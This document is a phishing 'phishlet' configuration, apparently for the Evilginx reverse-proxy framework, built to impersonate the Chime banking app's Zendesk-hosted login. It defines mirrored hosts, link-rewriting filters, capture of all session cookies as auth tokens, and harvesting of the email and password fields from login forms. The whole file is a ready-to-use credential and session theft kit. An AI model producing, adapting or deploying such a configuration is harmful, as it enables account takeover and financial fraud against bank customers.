author: '@longwu'
min_ver: '2.3.0'

proxy_hosts:
  - {phish_sub: 'chime', orig_sub: 'chime', domain: 'zendesk.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'member', orig_sub: 'member', domain: 'chime.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: '', orig_sub: '', domain: 'chime.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'chime.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'nd', orig_sub: 'nd', domain: 'chime.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'transaction', orig_sub: 'transaction', domain: 'chime.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'chime-api', orig_sub: 'chime-api', domain: 'arkoselabs.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'cdnjs', orig_sub: 'cdnjs', domain: 'cloudflare.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'segment.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'api-chime.nd', orig_sub: 'api-chime.nd', domain: 'nudatasecurity.com', session: false, is_landing: false, auto_filter: false}

sub_filters:
  - {triggers_on: 'chime.zendesk.com', orig_sub: 'chime', domain: 'zendesk.com', search: '{hostname_regexp}/', replace: '{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'application/signed-exchange']}
  - {triggers_on: 'chime.zendesk.com', orig_sub: 'chime', domain: 'zendesk.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'application/signed-exchange']}
  - {triggers_on: 'chime.zendesk.com', orig_sub: 'member', domain: 'chime.com', search: '{hostname_regexp}/', replace: '{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'application/signed-exchange']}
  - {triggers_on: 'chime.zendesk.com', orig_sub: 'member', domain: 'chime.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'application/signed-exchange']}
  - {triggers_on: 'chime.zendesk.com', orig_sub: '', domain: 'chime.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'application/signed-exchange']}
  - {triggers_on: 'chime.zendesk.com', orig_sub: '', domain: 'chime.com', search: '{hostname_regexp}/', replace: '{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'application/signed-exchange']}
  - {triggers_on: 'chime.zendesk.com', orig_sub: 'www', domain: 'chime.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'application/signed-exchange']}
  - {triggers_on: 'chime.zendesk.com', orig_sub: 'www', domain: 'chime.com', search: '{hostname_regexp}/', replace: '{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'application/signed-exchange']}
  - {triggers_on: 'chime.zendesk.com', orig_sub: 'nd', domain: 'chime.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'application/signed-exchange']}
  - {triggers_on: 'chime.zendesk.com', orig_sub: 'nd', domain: 'chime.com', search: '{hostname_regexp}/', replace: '{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'application/signed-exchange']}
  - {triggers_on: 'chime.zendesk.com', orig_sub: 'fonts', domain: 'gstatic.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'application/signed-exchange']}
  - {triggers_on: 'chime.zendesk.com', orig_sub: 'fonts', domain: 'gstatic.com', search: '{hostname_regexp}/', replace: '{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'application/signed-exchange']}
  - {triggers_on: 'chime.zendesk.com', orig_sub: 'transaction', domain: 'chime.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'application/signed-exchange']}
  - {triggers_on: 'chime.zendesk.com', orig_sub: 'transaction', domain: 'chime.com', search: '{hostname_regexp}/', replace: '{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'application/signed-exchange']}
  - {triggers_on: 'chime.zendesk.com', orig_sub: 'cdnjs', domain: 'cloudflare.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'application/signed-exchange']}
  - {triggers_on: 'chime.zendesk.com', orig_sub: 'cdnjs', domain: 'cloudflare.com', search: '{hostname_regexp}/', replace: '{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'application/signed-exchange']}
  - {triggers_on: 'chime.zendesk.com', orig_sub: 'cdn', domain: 'segment.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'application/signed-exchange']}
  - {triggers_on: 'chime.zendesk.com', orig_sub: 'cdn', domain: 'segment.com', search: '{hostname_regexp}/', replace: '{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'application/signed-exchange']}
  - {triggers_on: 'chime.zendesk.com', orig_sub: 'api-chime.nd', domain: 'nudatasecurity.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'application/signed-exchange']}
  - {triggers_on: 'chime.zendesk.com', orig_sub: 'api-chime.nd', domain: 'nudatasecurity.com', search: '{hostname_regexp}/', replace: '{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'application/signed-exchange']}

auth_tokens:
  - domain: '.zendesk.com'
    keys: ['.*,regexp']

auth_urls:
  - '/member/spending#/'
  - '/member/.*'

credentials:
  username:
    key: 'user[email]'
    search: '(.*)'
    type: 'post'
  password:
    key: 'user[password]'
    search: '(.*)'
    type: 'post'

login:
  domain: 'chime.zendesk.com'
  path: '/auth/v2/login/signin?return_to=https%3A%2F%2Fhelp.chime.com%2Fhc%2Fen-us&theme=hc&locale=en-us'